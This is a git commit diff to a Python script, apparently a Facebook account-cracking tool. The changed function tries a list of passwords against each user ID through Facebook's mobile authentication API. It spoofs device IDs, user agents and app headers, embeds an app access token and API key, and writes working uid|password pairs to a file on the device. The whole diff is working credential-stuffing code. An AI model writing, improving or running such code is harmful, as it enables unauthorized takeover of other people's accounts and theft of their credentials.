7a0b78a835e5b29cbc5c952842b25a092a1a33df
Art <121850372+arterxsk@users.noreply.github.com>
2023-12-01 13:32:34 +0800

    update x.py

--- x.py
+++ x.py
@@ -438,59 +438,48 @@ def gxds_files(uid, pxss):
     #session = requests.Session()
     try:
         for ps in pxss:
-            url = "https://n.facebook.com"
-            xurl = url + "/login.php"
             qwerty = random.choice(ugen)
             #gxdsfbs = session.get("https://mbasic.facebook.com").text
-            req = requests.Session()
-            req.headers.update(
-            {
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                "accept-language": "en_US",
-                "cache-control": "max-age=0",
-                "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-                "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": "Windows",
-                "sec-fetch-dest": "document",
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-user": "?1",
-                "upgrade-insecure-requests": "1",
-                "user-agent": qwerty,
-            }
-        )
-        with req.get(url) as response_body:
-            inspect = bs(response_body.text, "html.parser")
-            lsd_key = inspect.find("input", {"name": "lsd"})["value"]
-            jazoest_key = inspect.find("input", {"name": "jazoest"})["value"]
-            m_ts_key = inspect.find("input", {"name": "m_ts"})["value"]
-            li_key = inspect.find("input", {"name": "li"})["value"]
-            try_number_key = inspect.find("input", {"name": "try_number"})["value"]
-            unrecognized_tries_key = inspect.find(
-                "input", {"name": "unrecognized_tries"}
-            )["value"]
-            bi_xrwh_key = inspect.find("input", {"name": "bi_xrwh"})["value"]
             data = {
-                "lsd": lsd_key,
-                "jazoest": jazoest_key,
-                "m_ts": m_ts_key,
-                "li": li_key,
-                "try_number": try_number_key,
-                "unrecognized_tries": unrecognized_tries_key,
-                "bi_xrwh": bi_xrwh_key,
-                "email": uid,
-                "pass": ps,
-                "login": "submit",
-            }
-            response_body2 = req.post(
-                xurl, data=data, allow_redirects=True, timeout=300
-            )
-            lxgin = (
-                str(req.cookies.get_dict())[1:-1]
-                .replace("'", "")
-                .replace(",", ";")
-                .replace(":", "=")
-            )
+            "adid": str(uuid.uuid4()),
+            "format": "json",
+            "device_id": str(uuid.uuid4()),
+            "cpl": "true",
+            "family_device_id": str(uuid.uuid4()),
+            "credentials_type": "device_based_login_password",
+            "error_detail_type": "button_with_disabled",
+            "source": "device_based_login",
+            "email": uid,
+            "password": ps,
+            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+            "generate_session_cookies": "1",
+            "meta_inf_fbmeta": "",
+            "advertiser_id": str(uuid.uuid4()),
+            "currently_logged_in_userid": "0",
+            "locale": "en_GB",
+            "client_country_code": "GB",
+            "method": "auth.login",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "api_key": "882a8490361da98702bf97a021ddc14d"}
+            headers = {
+            'User-Agent': qwerty,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
+            lxgin=json.loads(p)
             if "session_key" in lxgin:
                 print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " - \033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
